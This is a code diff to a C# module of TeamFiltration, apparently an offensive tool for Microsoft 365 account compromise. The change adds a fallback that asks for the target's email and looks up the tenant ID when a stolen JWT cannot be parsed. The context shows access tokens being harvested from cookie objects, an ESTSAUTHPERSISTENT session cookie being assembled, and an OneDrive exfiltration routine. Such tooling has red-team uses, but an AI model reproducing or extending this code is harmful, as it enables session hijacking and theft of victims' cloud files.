@@ -1065,7 +1065,7 @@ namespace TeamFiltration.Modules
 
             //Look for accessTokens inside cookie objects and add them to the database!
             //TODO: Make sure we do not add tokens that are already in the database, and that the tokens we add are infact valid!
-           
+
             foreach (var possibleToken in cookieObjects)
             {
                 var regeexData = Regex.Match(possibleToken.value, @"(ey[a-zA-Z0-9_=]+)\.([a-zA-Z0-9_=]+)\.([a-zA-Z0-9_\-\+\/=]*)");
@@ -1103,8 +1103,22 @@ namespace TeamFiltration.Modules
             }
             else
             {
-                Console.WriteLine("[!] Failed to parse JWT and get TenantId");
-                Environment.Exit(0);
+                Console.WriteLine("[!] Failed to parse JWT and get TenantId automatically, what is the targets email?");
+                Console.WriteLine("#>");
+                string targetEmail = Console.ReadLine();
+                try
+                {
+                    string domain = targetEmail.Trim().Split("@")[1];
+                    GetOpenIdConfigResp openIdConfig = await msolHandler.GetOpenIdConfig(domain);
+                    tenantId = openIdConfig.authorization_endpoint.Split("/")[3];
+                }
+                catch (Exception)
+                {
+                    Console.WriteLine("[!] Failed to retrive TenantID, cannot continue without");
+                    Environment.Exit(0);
+                }
+             
+                
             }
             string cookie = "ESTSAUTHPERSISTENT=" + cookieObjects.Where(x => x.name.Equals("ESTSAUTHPERSISTENT")).FirstOrDefault()?.value;
             if (string.IsNullOrEmpty(cookie))
@@ -1264,12 +1278,12 @@ namespace TeamFiltration.Modules
             }
 
         }
-      
+
 
         #region baseExfilFunctions
         private static async Task OneDriveExfilAsync(BearerTokenResp companySharePointToken, BearerTokenResp msGraphToken, BearerTokenResp teamsToken, BearerTokenResp personalSharePointToken, OneDriveHandler oneDriveGrapHandler, string outpath)
         {
-            outpath = Path.Combine(outpath, "OneDrive"); 
+            outpath = Path.Combine(outpath, "OneDrive");
             var username = Helpers.Generic.GetUsername(teamsToken.access_token);
             var sharePointHandler = new SharePointHandler(companySharePointToken, username, _globalProperties, _databaseHandler);
             var personalSharePointHandler = new SharePointHandler(personalSharePointToken, username, _globalProperties, _databaseHandler);
